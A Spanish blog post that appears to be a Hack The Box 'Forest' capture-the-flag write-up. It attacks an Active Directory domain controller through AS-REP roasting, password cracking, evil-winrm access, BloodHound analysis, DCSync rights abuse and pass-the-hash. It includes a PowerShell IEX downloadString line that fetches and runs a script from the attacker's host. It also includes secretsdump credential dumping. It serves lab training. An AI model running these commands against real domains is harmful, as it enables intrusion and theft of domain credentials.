---
layout: post
title: HTB_Forest
date: 2023/07/10
slug: HTB_Forest
heroImage: /assets/machines.jpg
---

# Forest {-}

## Introduccion {-}

La maquina del dia 12/08/2021 se llama Forest.

El replay del live se puede ver aqui

[![S4vitaar Forest maquina](https://img.youtube.com/vi/OxLeD1x3nRc/0.jpg)](https://www.youtube.com/watch?v=OxLeD1x3nRc)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.161
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.161
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49918 10.10.10.161 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 464    | kpasswd5?  |                                          |                           |
| 593    | ncacn_http |                                          |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 9389   | mc-nmf     | Puertos por defecto de windows           |                           |
| 47001  | http       | Puertos por defecto de windows           |                           |
| 49664  | msrpc      | Puertos por defecto de windows           |                           |
| 49665  | msrpc      | Puertos por defecto de windows           |                           |
| 49666  | msrpc      | Puertos por defecto de windows           |                           |
| 49667  | msrpc      | Puertos por defecto de windows           |                           |
| 49671  | msrpc      | Puertos por defecto de windows           |                           |
| 49676  | ncacn_http | Puertos por defecto de windows           |                           |
| 49677  | msrpc      | Puertos por defecto de windows           |                           |
| 49684  | msrpc      | Puertos por defecto de windows           |                           |
| 49703  | msrpc      | Puertos por defecto de windows           |                           |
| 49918  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.161
smbclient -L 10.10.10.82 -N
```

Vemos que estamos en frente de una maquina Windows Server 2016 Standard de 64 bit pro que se llama **FOREST** en el dominio **htb.local**.
No vemos ningun recursos compartidos a nivel de red.
Añadimos el dominio a nuestro 
```bash
 /etc/hosts 
```
.

### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.161 -N

rpcclient $> enumdomusers
```

Como nos deja connectarnos con el null session vamos a enumerar esto con la utilidad rpcenum de s4vitar

```bash
git clone https://github.com/s4vitar/rpcenum
cd rpcenum
./rpcenum -e All -i 10.10.10.161
```

Como aqui ya tenemos un listado de usuarios validos, lanzamos un ataque asproarst.

## Vulnerability Assessment {-}

### Asproasting Attack {-}

Los ataques Asproasting se pueden manejar con la utilidad 
```bash
 GetNPUsers.py 
```


```bash
cd content
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]'
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users.txt
GetNPUsers.py htb.local/ -no-pass -userfile users.txt 2>/dev/null
```

Aqui vemos el TGT del usuario **svc-alfresco**. Copiamos todo el hash del usuario svc-alfresco en un fichero llamado hash
y lo crackeamos con John


### Crackeando el hash con John {-}

```bash
john -wordlists=/usr/share/wordlists/rockyou.txt hash
```

Aqui encontramos su contraseña. Ya podemos effectuar un Kerberoasting attack. Pero primero, como siempre, credenciales encontradas son 
credenciales que checkeamos con crackmapexec

```bash
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

### LDAP enumeracion con ldapdomaindump {-}

Esta utilidad nos permitte recuperar en formato html las informaciones del servicio LDAP.

```bash
cd /var/www/html
ldapdomaindump -u 'htb.local/svc-alfresco' -p 's3rvice' 10.10.10.161
service apache2 start
```

y podemos mirarlo con firefox en localhost

### Kereroasting attack {-}

Los ataques Kereroasting se pueden manejar con la utilidad 
```bash
 GetUserSPNs.py 
```


```bash
GetUserSPNs.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -request -dc-ip 10.10.10.161
```

Esta utilidad nos retorna un mensaje como que no son las buenas credenciales. Si es el caso vamos si nos podemos connectar
por win-rm.


## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM {-}

```bash
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

Aqui vemos quel usuario es (Pwn3d!)

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

ya estamos a dentro de la maquina y podemos ver la flag del usuario.


### Enumeracion del systema para preparar la escalada de privilegios {-}

1. instalamos bloodhound y neo4j

    ```bash
    sudo apt install neo4j bloodhound
    ```

1. lanzamos neo4j service

    ```bash
    sudo neo4j console
    ```

1. lanzamos bloodhound

    ```bash
    bloodhound --no-sandbox &> /dev/null &
    disown
    ```

1. connectamos bloodhound al neo4j database
1. Collectamos la data con SharpHound.ps1

    - descargamos en sharphound
    
        ```bash
        wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
        ```

    - lo uploadeamos desde el evil-winrm

        ```bash
        upload SharpHound.ps1
        ```

    - lo lanzamos desde el evil-winrm

        ```bash
        Import-Module .\SharpHound.ps1
        Invoke-BloodHound -CollectionMethod All
        dir
        ```

    - ahora que tenemos el zip nos lo descargamos

        ```bash
        download 20210812133453_BloodHound.zip
        ```

1. Drag & Drop del fichero **.zip** hacia la ventana del bloodhound y en el Analysis tab

    - Find all Domains Admins -> Show Administrator of the domain
    

Aqui hay una via potencial (un camino) que nos permitte convertir en usuario administrador

## Privilege Escalation {-}
![Forest-bloodhoud](/assets/images/Forest-bloodhound.png) 

### Rootear la maquina {-}

El usuario svc-alfresco es miembro del groupo service accounts que es miembro de grupo privileged accounts que es miembro 
del grupo account operators.

Este grupo account operators tiene permissions de typo Generic all sobre el grupo Exchange windows permissions. Si buscamos
por internet lo que es el account operators vemos que es un grupo de verdad que permitte crear usuarios y privilegios. Lo comprobamos
en el evil-winRM

```bash
net user s4vitar s4vit4r123$! /add /domain
net user s4vitar
```

Effectivamente podemos crear usuarios.

Si seguimos analysando el BloodHound vemos que el grupo exchange Windows permission tiene capacidad de typo WriteDacl sobre el dominio.
Si hacemos un click derecho sobre el **WriteDacl** podemos mirar mas informaciones

```{r, echo = FALSE, fig.cap="Bloodhound abuse WriteDacl", out.width="90%"}
    knitr::include_graphics("images/Forest-Abuse_writedacl.png")

![Forest-Abuse_writedacl](/assets/images/Forest-Abuse_writedacl.png) 
    ```bash
    net group
    net group "Exchange Windows Permissions" s4vitar /add
    net user s4vitar
    ```

1. Passamos a la maquina victima el powerView

    - en la maquina de atacante

        ```bash
        wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/powerview.ps1')
        ```

1. Asignamos el privilegio ds sync al usuario s4vitar

    ```bash
    $SecPassword = ConvertTo-SecureString 's4vit4r123$!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('htb.local\s4vitar', $SecPassword)
    Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity s4vitar -Rights DCSync
    ```

1. Desde la maquina de atacante podemos lanzar un impacket-secretsdump para recuperar los hashes de los usuarios

    ```bash
    impacket-secretsdump htb.local/s4vitar@10.10.10.161
    ```

Ya tenemos el hash del usuario administrador

```{r, echo = FALSE, fig.cap="DCSync Admin hash", out.width="90%"}
    knitr::include_graphics("images/Forest-dcsync-admin-hash.png")
```

evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d3372a07ceea6'
![Forest-dcsyc-admi-hash](/assets/images/Forest-dcsync-admin-hash.png) 
```


```bash
 WHOAMI -> htb\administrator 
```
 ;)
